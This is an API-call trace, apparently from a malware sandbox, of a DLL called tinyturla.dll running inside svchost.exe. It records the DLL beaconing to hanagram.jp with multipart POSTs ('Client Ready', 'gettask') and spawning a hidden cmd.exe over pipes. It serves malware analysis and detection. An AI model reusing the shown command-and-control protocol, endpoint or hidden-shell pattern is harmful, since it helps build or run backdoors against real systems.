+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e8037f0
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f5920b0
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e895320
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x2c8] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 30000 ms to 15000 ms 
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86F1C0
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803410
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A4850
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66b470
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F668
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C6E40
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F5920B0
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C6E40
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xbe
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x2d4]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F5920B0
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43F8AE4C0
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="result""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "Client Ready"
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xbe
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F6C0
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000F43F5920B0
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7fff146bd415 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000F43F5920B0
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000F43F8AA6F0
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000F43F2D0A04
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7fff146bd45c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0x3f5920b0
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000F44055F6E0
+[RET] 0x7fff146bb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f5920b0
+[PAR] LPVOID    lpBuffer              : 0x000000F43F36FEE0
+[PAR] DWORD     dwNumberOfBytesToRead : 0x10
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F6E4
+[RET] 0x7fff146bb844 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000F43E7A0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000F43F36FEE0
+[PAR] SIZE_T Size        : 0x20
+[RET] 0x7fff146bb877 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f5920b0
+[PAR] LPVOID    lpBuffer              : 0x000000F43F8A5550
+[PAR] DWORD     dwNumberOfBytesToRead : 0x10
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F6E4
+[RET] 0x7fff146bb8ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e803410
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f5920b0
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66b470
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0xea60 (60 sec)
+[RET] 0x7fff146b4e09 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 60000 ms to 15000 ms 
+
+[ * ] [pid 0x254][tid 0x2c8] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 30000 ms to 15000 ms 
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86E560
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803dc0
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A4E50
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66aad0
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F728
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F3BD070
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F370140
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F3BC580
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xaf
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F370140
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43E806620
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="gettask""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xaf
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F780
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000F43F370140
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7fff146bd415 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000F43F370140
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000F43F8AA820
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000F43E88AE84
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7fff146bd45c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0x3f370140
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000F44055F7A0
+[RET] 0x7fff146bb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f370140
+[PAR] LPVOID    lpBuffer              : 0x000000F43F36FF00
+[PAR] DWORD     dwNumberOfBytesToRead : 0x10
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7A4
+[RET] 0x7fff146bb844 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000F43E7A0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000F43F36FF00
+[PAR] SIZE_T Size        : 0x20
+[RET] 0x7fff146bb877 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f370140
+[PAR] LPVOID    lpBuffer              : 0x000000F43F8A50A0
+[PAR] DWORD     dwNumberOfBytesToRead : 0x10
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7A4
+[RET] 0x7fff146bb8ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e803dc0
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f370140
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66aad0
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x927c0 (600 sec)
+[RET] 0x7fff146b50aa in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 600000 ms to 15000 ms 
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CreatePipe> in [KERNEL32.DLL] 
+[PAR] PHANDLE               hReadPipe        : 0x000000F4405DF7D0
+[PAR] PHANDLE               hWritePipe       : 0x000000F4405DF7C0
+[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000F4405DF7E8
+[PAR] DWORD                 nSize            : 0xdcd8
+[RET] 0x7fff146b45fb in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CreatePipe> in [KERNEL32.DLL] 
+[PAR] PHANDLE               hReadPipe        : 0x000000F4405DF7D8
+[PAR] PHANDLE               hWritePipe       : 0x000000F4405DF7C8
+[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000F4405DF7E8
+[PAR] DWORD                 nSize            : 0xa00000
+[RET] 0x7fff146b461e in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CreateProcessA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
+[PAR] LPCTSTR               lpCommandLine        : 0x00007FFF146E0888
+[STR]                       -> "C:\Windows\System32\cmd.exe"
+[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
+[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
+[PAR] BOOL                  bInheritHandles      : 0x1
+[PAR] DWORD                 dwCreationFlags      : 0x8000000 (CREATE_NO_WINDOW)
+[PAR] LPVOID                lpEnvironment        : 0x0
+[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
+[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x000000F4405DF820
+[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x000000F4405DF800
+[RET] 0x7fff146b46b0 in [tinyturla.dll]
+
+Creation de Processus, pid [0x28c] (C:\Windows\System32\cmd.exe)
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x1ec
+[RET] 0x7fff146b46c3 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x5f4
+[RET] 0x7fff146b46ce in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WriteFile> in [KERNEL32.DLL] 
+[PAR] HANDLE hFile                 : 0x66c
+[PAR] LPVOID lpBuffer              : 0x000000F4405DF890
+[PAR] DWORD  nNumberOfBytesToWrite : 0xf
+[RET] 0x7fff146b8c11 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WriteFile> in [KERNEL32.DLL] 
+[PAR] HANDLE hFile                 : 0x66c
+[PAR] LPVOID lpBuffer              : 0x000000F4405DF890
+[PAR] DWORD  nNumberOfBytesToWrite : 0xd
+[RET] 0x7fff146b8c11 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WriteFile> in [KERNEL32.DLL] 
+[PAR] HANDLE hFile                 : 0x66c
+[PAR] LPVOID lpBuffer              : 0x000000F4405DF890
+[PAR] DWORD  nNumberOfBytesToWrite : 0x5
+[RET] 0x7fff146b8c11 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WaitForSingleObject> in [KERNEL32.DLL] 
+[PAR] HANDLE hHandle        : 0x638
+[PAR] DWORD  dwMilliseconds : 0x75300 
+[RET] 0x7fff146b48f1 in [tinyturla.dll]
+
+Creation de Processus, pid [0x124] (C:\Windows\System32\conhost.exe)
+
+Creation de Processus, pid [0xa64] (C:\Windows\System32\chcp.com)
+
+Destruction de Processus, pid [0xa64] (C:\Windows\System32\chcp.com)
+
+Destruction de Processus, pid [0x28c] (C:\Windows\System32\cmd.exe)
+
+Destruction de Processus, pid [0x124] (C:\Windows\System32\conhost.exe)
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <TerminateProcess> in [KERNEL32.DLL] 
+[RET] 0x7fff146b48fd in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <PeekNamedPipe> in [KERNEL32.DLL] 
+[RET] 0x7fff146b837d in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <ReadFile> in [KERNEL32.DLL] 
+[PAR] HANDLE hFile                : 0x618
+[PAR] LPVOID lpBuffer             : 0x000000F4405CF950
+[PAR] DWORD  nNumberOfBytesToRead : 0xfde7
+[RET] 0x7fff146b83ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <PeekNamedPipe> in [KERNEL32.DLL] 
+[RET] 0x7fff146b8465 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x618
+[RET] 0x7fff146b4932 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x66c
+[RET] 0x7fff146b493d in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WaitForSingleObject> in [KERNEL32.DLL] 
+[PAR] HANDLE hHandle        : 0x4e0
+[PAR] DWORD  dwMilliseconds : 0xffffffff (INFINITE)
+[RET] 0x7fff146b8b4e in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x2c8] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 30000 ms to 15000 ms 
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86E4B0
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803410
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A53F0
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66b730
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F728
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C7460
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F66A450
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C7620
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xaf
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43E806260
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="gettask""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xaf
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F780
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000F43F66A450
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7fff146bd415 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000F43F66A450
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000F43F8AA6F0
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000F43F2D0764
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7fff146bd45c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0x3f66a450
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000F44055F7A0
+[RET] 0x7fff146bb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43E86CD70
+[PAR] DWORD     dwNumberOfBytesToRead : 0x10
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7A4
+[RET] 0x7fff146bb844 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000F43E7A0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000F43E86CD70
+[PAR] SIZE_T Size        : 0x20
+[RET] 0x7fff146bb877 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F8A4FE0
+[PAR] DWORD     dwNumberOfBytesToRead : 0x10
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7A4
+[RET] 0x7fff146bb8ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e803410
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66a450
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66b730
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86EDA0
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803410
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A52A0
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66ac30
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F748
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F3BC580
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
